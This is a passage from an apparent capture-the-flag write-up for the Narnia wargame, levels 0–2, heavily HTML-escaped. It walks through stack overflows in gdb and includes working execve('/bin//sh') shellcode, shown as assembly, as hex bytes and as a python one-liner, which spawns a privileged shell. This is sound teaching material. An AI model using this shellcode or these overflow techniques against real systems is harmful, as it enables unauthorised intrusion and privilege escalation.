   0x080484ca &amp;lt;+6&amp;gt;: sub    esp,0x30
   0x080484cd &amp;lt;+9&amp;gt;: mov    DWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;esp+0x2c&lt;span class="o"&gt;]&lt;/span&gt;,0x41414141
   0x080484d5 &amp;lt;+17&amp;gt;:  mov    DWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;esp&lt;span class="o"&gt;]&lt;/span&gt;,0x8048640
   0x080484dc &amp;lt;+24&amp;gt;:  call   0x80483b0 &amp;lt;puts@plt&amp;gt;
   0x080484e1 &amp;lt;+29&amp;gt;:  mov    eax,0x8048673
   0x080484e6 &amp;lt;+34&amp;gt;:  mov    DWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;esp&lt;span class="o"&gt;]&lt;/span&gt;,eax
   0x080484e9 &amp;lt;+37&amp;gt;:  call   0x80483a0 &amp;lt;&lt;span class="nb"&gt;printf&lt;/span&gt;@plt&amp;gt;
   0x080484ee &amp;lt;+42&amp;gt;:  mov    eax,0x8048689
   0x080484f3 &amp;lt;+47&amp;gt;:  lea    edx,&lt;span class="o"&gt;[&lt;/span&gt;esp+0x18&lt;span class="o"&gt;]&lt;/span&gt;
   0x080484f7 &amp;lt;+51&amp;gt;:  mov    DWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;esp+0x4&lt;span class="o"&gt;]&lt;/span&gt;,edx
   0x080484fb &amp;lt;+55&amp;gt;:  mov    DWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;esp&lt;span class="o"&gt;]&lt;/span&gt;,eax
   0x080484fe &amp;lt;+58&amp;gt;:  call   0x8048400 &amp;lt;__isoc99_scanf@plt&amp;gt;
   0x08048503 &amp;lt;+63&amp;gt;:  mov    eax,0x804868e
   0x08048508 &amp;lt;+68&amp;gt;:  lea    edx,&lt;span class="o"&gt;[&lt;/span&gt;esp+0x18&lt;span class="o"&gt;]&lt;/span&gt;
   0x0804850c &amp;lt;+72&amp;gt;:  mov    DWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;esp+0x4&lt;span class="o"&gt;]&lt;/span&gt;,edx
&lt;span class="o"&gt;(&lt;/span&gt;...&lt;span class="o"&gt;)&lt;/span&gt;
End of assembler dump.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let's put a break point right after &lt;code&gt;scanf&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; b *main+63
Breakpoint 1 at 0x8048503
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We run the debugged program with 20 Bs (\x42) as the input. It stops in the address above, right after &lt;code&gt;scanf&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; r
Starting program: /games/narnia/narnia0
Correct val&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance:

Breakpoint 1, 0x08048503 in main &lt;span class="o"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now we examine the memory in, say, 12 counts:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; x/12xw &lt;span class="nv"&gt;$esp&lt;/span&gt;
0xffffd6a0: 0x08048689  0xffffd6b8  0x08049ff4  0x08048591
0xffffd6b0: 0xffffffff  0xf7e59d46  0x42424242  0x42424242
0xffffd6c0: 0x42424242  0x42424242  0x42424242  0x41414100
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The variable &lt;em&gt;buf&lt;/em&gt; is in the 7-11th entries (0x42424242). Right after that  is &lt;em&gt;val&lt;/em&gt; (which we know is still 0x41414141). Wait, do you see the two zeros in &lt;code&gt;0x41414100&lt;/code&gt;? This is the space in the end of &lt;em&gt;buf&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Finally, we test with 20 Bs + 4 Cs and confirm that our exploit works:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; x/12xw &lt;span class="nv"&gt;$esp&lt;/span&gt;
0xffffd6a0: 0x08048689  0xffffd6b8  0x08049ff4  0x08048591
0xffffd6b0: 0xffffffff  0xf7e59d46  0x42424242  0x42424242
0xffffd6c0: 0x42424242  0x42424242  0x42424242  0x43434343
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Level 1:  Stack Overflow  with Environment Variables&lt;/h2&gt;
&lt;h3&gt;Step 1: Understanding the Problem&lt;/h3&gt;
&lt;p&gt;The second level starts with:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;narnia1&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;melinda&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;narnia&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia1&lt;/span&gt;
&lt;span class="n"&gt;Give&lt;/span&gt; &lt;span class="n"&gt;me&lt;/span&gt; &lt;span class="n"&gt;something&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;execute&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;env&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;variable&lt;/span&gt; &lt;span class="n"&gt;EGG&lt;/span&gt;

&lt;span class="n"&gt;narnia1&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;melinda&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;narnia&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="n"&gt;narnia1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;
&lt;span class="cp"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;
  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="p"&gt;)();&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getenv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;EGG&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Give me something to execute at the env-variable EGG&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Trying to execute EGG!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;ret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getenv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;EGG&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The program searches for an environment variable &lt;strong&gt;EGG&lt;/strong&gt; and then it exits if this variable doesn't exist. If it does, &lt;strong&gt;EGG&lt;/strong&gt;'s value is passed as a function. Really secure.&lt;/p&gt;
&lt;h3&gt;Step 1: Creating an Environment Variable with our Exploit&lt;/h3&gt;
&lt;p&gt;The most obvious option for an exploit is to spawn a privileged shell, so that we can read the next level's password.&lt;/p&gt;
&lt;p&gt;Let's suppose we don't know that we need to write the exploit in memory language. We could try this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;narnia1@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;export &lt;/span&gt;&lt;span class="nv"&gt;EGG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/ls&amp;quot;&lt;/span&gt;
narnia1@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$EGG&lt;/span&gt;
/bin/ls
narnia1@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;./narnia1
Trying to execute EGG!
Segmentation fault
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nope.&lt;/p&gt;
&lt;p&gt;We actually need to create a hexadecimal command to export to &lt;strong&gt;EGG&lt;/strong&gt;. We do this in Assembly and all the information we need is in the &lt;a href="http://insecure.org/stf/smashStack.html"&gt;Appendix A&lt;/a&gt; from &lt;a href="http://en.wikipedia.org/wiki/Elias_Levy"&gt;Aleph One&lt;/a&gt;'s paper. This allows us to write the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;narnia1@melinda:/tmp&lt;span class="nv"&gt;$ &lt;/span&gt;vi shellspawn.asm
xor eax, eax        ; make eax equal to 0
push eax            ; pushes null
push 0x68732f2f     ; pushes /sh &lt;span class="o"&gt;(&lt;/span&gt;//&lt;span class="o"&gt;)&lt;/span&gt;
push 0x6e69622f     ; pushes /bin
mov ebx, esp        ; passes the first argument
push eax            ; empty third argument
mov edx, esp        ; passes the third argument
push eax            ; empty second argument
mov ecx, esp        ; passes the second argument
mov al, 11          ; execve system call &lt;span class="c"&gt;#11&lt;/span&gt;
int 0x80            ; makes  an interrupt
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Compiling:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;narnia1@melinda:/tmp&lt;span class="nv"&gt;$ &lt;/span&gt;nasm shellspawn.asm
narnia1@melinda:/tmp&lt;span class="nv"&gt;$ &lt;/span&gt;ls
shellspawn  shellspawn.asm
narnia1@melinda:/tmp&lt;span class="nv"&gt;$ &lt;/span&gt;cat shellspawn
1�Ph//shh/bin��P��P���
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Exporting it to &lt;em&gt;EGG&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;narnia1@melinda:/tmp&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;export &lt;/span&gt;&lt;span class="nv"&gt;EGG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;cat shellspawn&lt;span class="k"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We are ready to exploit the binary:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;narnia1@melinda:/tmp&lt;span class="nv"&gt;$ &lt;/span&gt;/narnia/narnia1
Trying to execute EGG!
&lt;span class="nv"&gt;$ &lt;/span&gt;whoami
narnia2
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Step 4: Convert it to Hexadecimal&lt;/h3&gt;
&lt;p&gt;It's really useful to have a hexadecimal form of our exploit (as we will see in the next levels) so we will use &lt;code&gt;xxd&lt;/code&gt; to read it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;narnia5@melinda:/tmp&lt;span class="nv"&gt;$ &lt;/span&gt;xxd shellspawn
0000000: 31c0 5068 2f2f 7368 682f 6269 6e89 e350  1.Ph//shh/bin..P
0000010: 89e2 5089 e1b0 0bcd 80                   ..P......
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Awesome! We can go ahead and test it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;narnia1@melinda:/tmp&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;export &lt;/span&gt;&lt;span class="nv"&gt;EGG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;python -c&lt;span class="s1"&gt;&amp;#39;print &amp;quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;
narnia1@melinda:/tmp&lt;span class="nv"&gt;$ &lt;/span&gt;/narnia/narnia1
Trying to execute EGG!
&lt;span class="nv"&gt;$ &lt;/span&gt;whoami
narnia2
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Level 2: Stack Overflow to the Return Address&lt;/h2&gt;
&lt;h3&gt;Step 1: Understanding the Problem:&lt;/h3&gt;
&lt;p&gt;The third level starts with:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;narnia2&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;melinda&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;narnia&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia2&lt;/span&gt;
&lt;span class="nl"&gt;Usage:&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia2&lt;/span&gt; &lt;span class="n"&gt;argument&lt;/span&gt;
&lt;span class="n"&gt;narnia2&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;melinda&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;narnia&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="n"&gt;narnia2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;
&lt;span class="cp"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[]){&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;128&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argc&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Usage: %s argument&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
    &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="n"&gt;strcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
  &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%s&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This function copies an input string  to a &lt;em&gt;buf&lt;/em&gt;, using &lt;code&gt;strcpy()&lt;/code&gt; (instead of safer &lt;code&gt;strncpy()&lt;/code&gt;).  Since there is no bounds checking,  &lt;em&gt;buf&lt;/em&gt; overflows to the higher address  in the Stack if the input is larger than 128 bytes.&lt;/p&gt;
&lt;p&gt;In this problem we will use overflow to take control of the return address of the main function, which is right after &lt;em&gt;buf&lt;/em&gt;. We will overwrite this to any address we want, for example to the address of a beautiful crafted exploit.&lt;/p&gt;
&lt;h3&gt;Step 2: Finding the Frame Size&lt;/h3&gt;
&lt;p&gt;To find where the returning address of this function is located, we use &lt;em&gt;gdb&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;narnia2@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;gdb ./narnia2
&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nb"&gt;set &lt;/span&gt;disassembly-flavor intel
&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; disas main
Dump of assembler code &lt;span class="k"&gt;for function &lt;/span&gt;main:
   0x08048424 &amp;lt;+0&amp;gt;: push   ebp
   0x08048425 &amp;lt;+1&amp;gt;: mov    ebp,esp
   0x08048427 &amp;lt;+3&amp;gt;: and    esp,0xfffffff0
   0x0804842a &amp;lt;+6&amp;gt;: sub    esp,0x90
   0x08048430 &amp;lt;+12&amp;gt;:  cmp    DWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;ebp+0x8&lt;span class="o"&gt;]&lt;/span&gt;,0x1
   0x08048434 &amp;lt;+16&amp;gt;:  jne    0x8048458 &amp;lt;main+52&amp;gt;
   0x08048436 &amp;lt;+18&amp;gt;:  mov    eax,DWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;ebp+0xc&lt;span class="o"&gt;]&lt;/span&gt;
   0x08048439 &amp;lt;+21&amp;gt;:  mov    edx,DWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;eax&lt;span class="o"&gt;]&lt;/span&gt;
   0x0804843b &amp;lt;+23&amp;gt;:  mov    eax,0x8048560
   0x08048440 &amp;lt;+28&amp;gt;:  mov    DWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;esp+0x4&lt;span class="o"&gt;]&lt;/span&gt;,edx
   0x08048444 &amp;lt;+32&amp;gt;:  mov    DWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;esp&lt;span class="o"&gt;]&lt;/span&gt;,eax
   0x08048447 &amp;lt;+35&amp;gt;:  call   0x8048320 &amp;lt;&lt;span class="nb"&gt;printf&lt;/span&gt;@plt&amp;gt;
   0x0804844c &amp;lt;+40&amp;gt;:  mov    DWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;esp&lt;span class="o"&gt;]&lt;/span&gt;,0x1
   0x08048453 &amp;lt;+47&amp;gt;:  call   0x8048350 &amp;lt;&lt;span class="nb"&gt;exit&lt;/span&gt;@plt&amp;gt;
   0x08048458 &amp;lt;+52&amp;gt;:  mov    eax,DWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;ebp+0xc&lt;span class="o"&gt;]&lt;/span&gt;
   0x0804845b &amp;lt;+55&amp;gt;:  add    eax,0x4
   0x0804845e &amp;lt;+58&amp;gt;:  mov    eax,DWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;eax&lt;span class="o"&gt;]&lt;/span&gt;
   0x08048460 &amp;lt;+60&amp;gt;:  mov    DWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;esp+0x4&lt;span class="o"&gt;]&lt;/span&gt;,eax
   0x08048464 &amp;lt;+64&amp;gt;:  lea    eax,&lt;span class="o"&gt;[&lt;/span&gt;esp+0x10&lt;span class="o"&gt;]&lt;/span&gt;
   0x08048468 &amp;lt;+68&amp;gt;:  mov    DWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;esp&lt;span class="o"&gt;]&lt;/span&gt;,eax
   0x0804846b &amp;lt;+71&amp;gt;:  call   0x8048330 &amp;lt;strcpy@plt&amp;gt;
   0x08048470 &amp;lt;+76&amp;gt;:  mov    eax,0x8048574
   0x08048475 &amp;lt;+81&amp;gt;:  lea    edx,&lt;span class="o"&gt;[&lt;/span&gt;esp+0x10&lt;span class="o"&gt;]&lt;/span&gt;
   0x08048479 &amp;lt;+85&amp;gt;:  mov    DWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;esp+0x4&lt;span class="o"&gt;]&lt;/span&gt;,edx
   0x0804847d &amp;lt;+89&amp;gt;:  mov    DWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;esp&lt;span class="o"&gt;]&lt;/span&gt;,eax
   0x08048480 &amp;lt;+92&amp;gt;:  call   0x8048320 &amp;lt;&lt;span class="nb"&gt;printf&lt;/span&gt;@plt&amp;gt;
   0x08048485 &amp;lt;+97&amp;gt;:  mov    eax,0x0
   0x0804848a &amp;lt;+102&amp;gt;: leave
   0x0804848b &amp;lt;+103&amp;gt;: ret
End of assembler dump.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We create a break point right before the exit:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;97&lt;/span&gt;
&lt;span class="n"&gt;Breakpoint&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0x8048485&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We run our program, feeding it with an argument of size 30 and we look to the memory (esp is the Stack pointer). The second value, &lt;strong&gt;0xffffd610&lt;/strong&gt;, indicates the start of the frame:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;B&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;`&lt;/span&gt;
&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="n"&gt;xw&lt;/span&gt; &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;esp&lt;/span&gt;
&lt;span class="mh"&gt;0xffffd600&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mh"&gt;0x08048574&lt;/span&gt;  &lt;span class="mh"&gt;0xffffd610&lt;/span&gt;  &lt;span class="mh"&gt;0x00000001&lt;/span&gt;  &lt;span class="mh"&gt;0xf7ebf729&lt;/span&gt;
&lt;span class="mh"&gt;0xffffd610&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mh"&gt;0x42424242&lt;/span&gt;  &lt;span class="mh"&gt;0x42424242&lt;/span&gt;  &lt;span class="mh"&gt;0x42424242&lt;/span&gt;  &lt;span class="mh"&gt;0x42424242&lt;/span&gt;
&lt;span class="mh"&gt;0xffffd620&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mh"&gt;0x42424242&lt;/span&gt;  &lt;span class="mh"&gt;0x42424242&lt;/span&gt;  &lt;span class="mh"&gt;0x42424242&lt;/span&gt;  &lt;span class="mh"&gt;0xf7004242&lt;/span&gt;
&lt;span class="mh"&gt;0xffffd630&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mh"&gt;0x08048258&lt;/span&gt;  &lt;span class="mh"&gt;0x00000000&lt;/span&gt;  &lt;span class="mh"&gt;0x00ca0000&lt;/span&gt;  &lt;span class="mh"&gt;0x00000001&lt;/span&gt;
&lt;span class="mh"&gt;0xffffd640&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mh"&gt;0xffffd86d&lt;/span&gt;  &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;  &lt;span class="mh"&gt;0xffffd69c&lt;/span&gt;  &lt;span class="mh"&gt;0xf7fcaff4&lt;/span&gt;
&lt;span class="mh"&gt;0xffffd650&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mh"&gt;0x08048490&lt;/span&gt;  &lt;span class="mh"&gt;0x08049750&lt;/span&gt;  &lt;span class="mh"&gt;0x00000002&lt;/span&gt;  &lt;span class="mh"&gt;0x080482fd&lt;/span&gt;
&lt;span class="mh"&gt;0xffffd660&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mh"&gt;0xf7fcb3e4&lt;/span&gt;  &lt;span class="mh"&gt;0x00008000&lt;/span&gt;  &lt;span class="mh"&gt;0x08049750&lt;/span&gt;  &lt;span class="mh"&gt;0x080484b1&lt;/span&gt;
&lt;span class="mh"&gt;0xffffd670&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mh"&gt;0xffffffff&lt;/span&gt;  &lt;span class="mh"&gt;0xf7e59d46&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now, looking  to the information about the frame, we get the return address at &lt;strong&gt;0xffffd69c&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;
&lt;span class="n"&gt;Stack&lt;/span&gt; &lt;span class="n"&gt;level&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;frame&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0xffffd6a0&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
